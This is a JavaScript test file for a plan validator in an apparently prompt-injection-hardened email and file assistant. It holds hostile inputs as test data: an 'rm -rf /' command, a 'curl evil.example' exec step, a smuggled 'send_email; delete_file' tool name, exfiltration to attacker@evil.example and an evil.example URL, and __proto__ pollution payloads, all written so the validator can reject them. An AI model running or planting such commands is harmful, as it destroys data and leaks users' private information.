import { test } from 'node:test';
import assert from 'node:assert/strict';
import { validatePlan } from '../../src/core/plan/validate.js';
import { describePlan } from '../../src/core/plan/describe.js';
import { LIMITS } from '../../src/core/plan/schema.js';
import { toolCatalog as catalog } from '../../src/core/tools/specs.js';
import { defineCatalog } from '../../src/core/tools/catalog.js';

const REQUEST = "Read Bob's latest email, summarise it, and send the summary to Alice.";

// The plan from the product spec, scenario A.
const goodPlan = () => ({
  version: 1,
  steps: [
    { id: 's1', op: 'call', tool: 'lookup_contact', args: { name: { lit: 'Alice' } }, as: 'alice' },
    { id: 's2', op: 'call', tool: 'lookup_contact', args: { name: { lit: 'Bob' } }, as: 'bob' },
    {
      id: 's3',
      op: 'call',
      tool: 'read_email',
      args: { from: { lit: 'Bob' }, which: { lit: 'latest' } },
      as: 'mail',
    },
    {
      id: 's4',
      op: 'quarantine',
      task: 'summarize',
      input: { ref: 'mail', path: ['body'] },
      output: 'text',
      as: 'summary',
    },
    {
      id: 's5',
      op: 'call',
      tool: 'send_email',
      args: {
        to: { ref: 'alice', path: ['email'] },
        subject: { lit: 'Summary' },
        body: { ref: 'summary' },
      },
    },
  ],
});

const check = (plan, request = REQUEST) => validatePlan(plan, { request, catalog });
const codes = (result) => (result.ok ? [] : result.errors.map((e) => e.code));

test('the spec scenario-A plan is valid', () => {
  const result = check(goodPlan());
  assert.equal(result.ok, true, JSON.stringify(result.errors));
});

test('non-object input is rejected', () => {
  for (const bad of [null, undefined, 'plan', 42, [], '{"version":1}']) {
    assert.equal(check(bad).ok, false, String(bad));
  }
});

test('unknown top-level or step keys are rejected (strict schema)', () => {
  const p = goodPlan();
  p.extra = 'x';
  assert.equal(check(p).ok, false);

  const q = goodPlan();
  q.steps[0].run = 'rm -rf /';
  assert.equal(check(q).ok, false);
});

test('wrong version or empty plan is rejected', () => {
  assert.equal(check({ ...goodPlan(), version: 2 }).ok, false);
  assert.equal(check({ version: 1, steps: [] }).ok, false);
});

test('an unknown operation is rejected', () => {
  const p = goodPlan();
  p.steps[0] = { id: 's1', op: 'exec', command: 'curl evil.example' };
  assert.equal(check(p).ok, false);
});

test('the tool must be a literal name; an expression cannot choose it', () => {
  const p = goodPlan();
  p.steps[4].tool = { ref: 'summary' };
  assert.equal(check(p).ok, false);
  const q = goodPlan();
  q.steps[4].tool = 'send_email; delete_file';
  assert.equal(check(q).ok, false);
});

test('an unknown tool is rejected', () => {
  const p = goodPlan();
  p.steps[4].tool = 'wire_money';
  assert.deepEqual(codes(check(p)), ['unknown_tool']);
});

test('argument names are checked: unknown, missing', () => {
  const p = goodPlan();
  p.steps[4].args.cc = { lit: 'x' };
  assert.ok(codes(check(p)).includes('unknown_argument'));

  const q = goodPlan();
  delete q.steps[4].args.body;
  assert.ok(codes(check(q)).includes('missing_argument'));
});

test('an optional argument may be left out', () => {
  const p = goodPlan();
  delete p.steps[2].args.which;
  assert.equal(check(p).ok, true);
});

test('using a variable before it is defined is rejected', () => {
  const p = goodPlan();
  p.steps.reverse();
  assert.ok(codes(check(p)).includes('undefined_variable'));
});

test('a variable cannot be defined twice', () => {
  const p = goodPlan();
  p.steps[1].as = 'alice';
  assert.ok(codes(check(p)).includes('variable_redefined'));
});

test('duplicate step ids are rejected', () => {
  const p = goodPlan();
  p.steps[1].id = 's1';
  assert.ok(codes(check(p)).includes('duplicate_step_id'));
});

test('variables defined inside a branch are not visible after it', () => {
  const p = {
    version: 1,
    steps: [
      { id: 'a', op: 'call', tool: 'read_email', args: { from: { lit: 'Bob' } }, as: 'mail' },
      {
        id: 'b',
        op: 'quarantine',
        task: 'extract',
        input: { ref: 'mail' },
        output: 'boolean',
        as: 'flag',
      },
      {
        id: 'c',
        op: 'if',
        cond: { ref: 'flag' },
        then: [
          {
            id: 'd',
            op: 'quarantine',
            task: 'summarize',
            input: { ref: 'mail' },
            output: 'text',
            as: 'inner',
          },
        ],
      },
      { id: 'e', op: 'show', value: { ref: 'inner' } },
    ],
  };
  assert.ok(codes(check(p)).includes('undefined_variable'));
});

test('a loop variable is visible only inside the loop', () => {
  const p = {
    version: 1,
    steps: [
      { id: 'a', op: 'call', tool: 'read_email', args: { from: { lit: 'Bob' } }, as: 'mail' },
      {
        id: 'b',
        op: 'quarantine',
        task: 'extract',
        input: { ref: 'mail' },
        output: 'list_of_text',
        as: 'items',
      },
      {
        id: 'c',
        op: 'for_each',
        items: { ref: 'items' },
        as: 'item',
        body: [{ id: 'd', op: 'show', value: { ref: 'item' } }],
      },
      { id: 'e', op: 'show', value: { ref: 'item' } },
    ],
  };
  assert.deepEqual(codes(check(p)), ['undefined_variable']);
});

// ---- Grounding ---------------------------------------------------------------

test('grounding: an invented destination is rejected', () => {
  const p = goodPlan();
  p.steps[4].args.to = { lit: 'attacker@evil.example' };
  assert.deepEqual(codes(check(p)), ['ungrounded_literal']);
});

test('grounding: an address typed in the request is accepted, case-insensitively', () => {
  const p = {
    version: 1,
    steps: [
      {
        id: 'a',
        op: 'call',
        tool: 'send_email',
        args: { to: { lit: 'ALICE@example.com' }, subject: { lit: 'Hi' }, body: { lit: 'Hello' } },
      },
    ],
  };
  assert.equal(check(p, 'Send a greeting to alice@example.com please').ok, true);
  assert.equal(check(p, 'Send a greeting to bob@example.com please').ok, false);
});

test('grounding: applies to selectors too (which contact, which file)', () => {
  const p = goodPlan();
  p.steps[0].args.name = { lit: 'Mallory' };
  assert.ok(codes(check(p)).includes('ungrounded_literal'));

  const f = {
    version: 1,
    steps: [{ id: 'a', op: 'call', tool: 'read_file', args: { path: { lit: 'secrets.txt' } } }],
  };
  assert.deepEqual(codes(check(f, 'Summarise my private file contract.pdf')), [
    'ungrounded_literal',
  ]);
  assert.equal(check(f, 'Summarise my private file secrets.txt').ok, true);
});

test('grounding: every literal inside a concat on a destination must be grounded', () => {
  const p = {
    version: 1,
    steps: [
      {
        id: 'a',
        op: 'call',
        tool: 'fetch_url',
        args: { url: { concat: [{ lit: 'https://evil.example/?q=' }, { lit: 'x' }] } },
      },
    ],
  };
  assert.ok(codes(check(p, 'Fetch the page')).includes('ungrounded_literal'));
});

test('grounding: an empty or whitespace literal never counts as grounded', () => {
  const p = goodPlan();
  p.steps[4].args.to = { lit: ' ' };
  assert.ok(codes(check(p)).includes('ungrounded_literal'));
  p.steps[4].args.to = { lit: '' };
  assert.ok(codes(check(p)).includes('ungrounded_literal'));
});

test('grounding: plain and data literals are not required to appear in the request', () => {
  assert.equal(check(goodPlan()).ok, true); // "Summary" and "latest" are planner text
});

// ---- Limits and hygiene -------------------------------------------------------

test('too many steps is rejected', () => {
  const steps = Array.from({ length: LIMITS.maxSteps + 1 }, (_, i) => ({
    id: `s${i}`,
    op: 'show',
    value: { lit: 'x' },
  }));
  assert.ok(codes(check({ version: 1, steps })).includes('too_many_steps'));
});

test('deep nesting is rejected', () => {
  let inner = [{ id: 'leaf', op: 'show', value: { lit: 'x' } }];
  for (let i = 0; i < 5; i++) {
    inner = [{ id: `n${i}`, op: 'if', cond: { lit: true }, then: inner }];
  }
  assert.ok(codes(check({ version: 1, steps: inner })).includes('too_deep'));
});

test('nested loops beyond the limit are rejected', () => {
  const p = {
    version: 1,
    steps: [
      {
        id: 'l1',
        op: 'for_each',
        items: { lit: 'x' },
        as: 'a',
        body: [
          {
            id: 'l2',
            op: 'for_each',
            items: { lit: 'x' },
            as: 'b',
            body: [
              {
                id: 'l3',
                op: 'for_each',
                items: { lit: 'x' },
                as: 'c',
                body: [{ id: 'z', op: 'show', value: { lit: 1 } }],
              },
            ],
          },
        ],
      },
    ],
  };
  assert.ok(codes(check(p)).includes('too_many_loops'));
});

test('huge literals and over-deep expressions are rejected', () => {
  const big = {
    version: 1,
    steps: [{ id: 'a', op: 'show', value: { lit: 'x'.repeat(LIMITS.maxLiteralLength + 1) } }],
  };
  assert.equal(check(big).ok, false);

  let expr = { lit: 'x' };
  for (let i = 0; i < 6; i++) expr = { concat: [expr] };
  assert.ok(
    codes(check({ version: 1, steps: [{ id: 'a', op: 'show', value: expr }] })).includes(
      'expression_too_deep',
    ),
  );
});

test('prototype-pollution style names are rejected', () => {
  const evil = JSON.parse(
    '{"version":1,"steps":[{"id":"a","op":"call","tool":"read_email","args":{"__proto__":{"lit":"x"},"from":{"lit":"Bob"}}}]}',
  );
  const result = check(evil, "Read Bob's email");
  assert.equal(result.ok, false);
  assert.equal(result.errors[0].code, 'forbidden_key');
  // Also nested deeper, and as a path element.
  const nested = JSON.parse(
    '{"version":1,"steps":[{"id":"a","op":"show","value":{"lit":"x","__proto__":{"a":1}}}]}',
  );
  assert.equal(check(nested).errors[0].code, 'forbidden_key');

  const badVar = { version: 1, steps: [{ id: 'a', op: 'show', value: { ref: 'constructor' } }] };
  assert.equal(check(badVar).ok, false);
  const badPath = {
    version: 1,
    steps: [
      { id: 'a', op: 'call', tool: 'read_email', args: { from: { lit: 'Bob' } }, as: 'm' },
      { id: 'b', op: 'show', value: { ref: 'm', path: ['__proto__'] } },
    ],
  };
  assert.equal(check(badPath, 'Bob').ok, false);
  assert.equal(Object.prototype.polluted, undefined);
});

test('validation depends only on the plan, the request and the catalog', () => {
  // The same inputs always give the same answer, whatever else is going on.
  const a = JSON.stringify(check(goodPlan()));
  const b = JSON.stringify(check(goodPlan()));
  assert.equal(a, b);
});

// ---- Catalog -----------------------------------------------------------------

test('defineCatalog rejects malformed specs', () => {
  const ok = { name: 't', title: 'T', effect: 'read', params: {} };
  assert.doesNotThrow(() => defineCatalog([ok]));
  assert.throws(() => defineCatalog([{ ...ok, name: 'Bad Name' }]), /Bad tool name/);
  assert.throws(() => defineCatalog([ok, ok]), /Duplicate/);
  assert.throws(() => defineCatalog([{ ...ok, effect: 'explode' }]), /effect/);
  assert.throws(() => defineCatalog([{ ...ok, params: { x: { role: 'boss' } } }]), /role/);
});

// ---- Preview -----------------------------------------------------------------

test('describePlan produces readable steps, marks sends, and flags untrusted results', () => {
  const lines = describePlan(check(goodPlan()).plan, catalog);
  assert.equal(lines.length, 5);
  assert.match(lines[0].text, /Look up contact: name = "Alice" → alice/);
  assert.match(lines[3].text, /quarantined model to summarise mail\.body.*untrusted/);
  assert.match(lines[4].text, /Send email: to = alice\.email.*\(send; checked by policy\)/);
});

test('describePlan indents blocks', () => {
  const plan = {
    version: 1,
    steps: [
      { id: 'a', op: 'call', tool: 'read_email', args: { from: { lit: 'Bob' } }, as: 'm' },
      {
        id: 'b',
        op: 'quarantine',
        task: 'extract',
        instruction: 'is it urgent',
        input: { ref: 'm' },
        output: 'boolean',
        as: 'u',
      },
      {
        id: 'c',
        op: 'if',
        cond: { ref: 'u' },
        then: [{ id: 'd', op: 'show', value: { lit: 'urgent' } }],
        else: [{ id: 'e', op: 'show', value: { lit: 'calm' } }],
      },
    ],
  };
  const lines = describePlan(check(plan, 'Bob').plan, catalog);
  assert.deepEqual(
    lines.map((l) => [l.depth, l.kind]),
    [
      [0, 'call'],
      [0, 'quarantine'],
      [0, 'if'],
      [1, 'show'],
      [0, 'else'],
      [1, 'show'],
    ],
  );
});
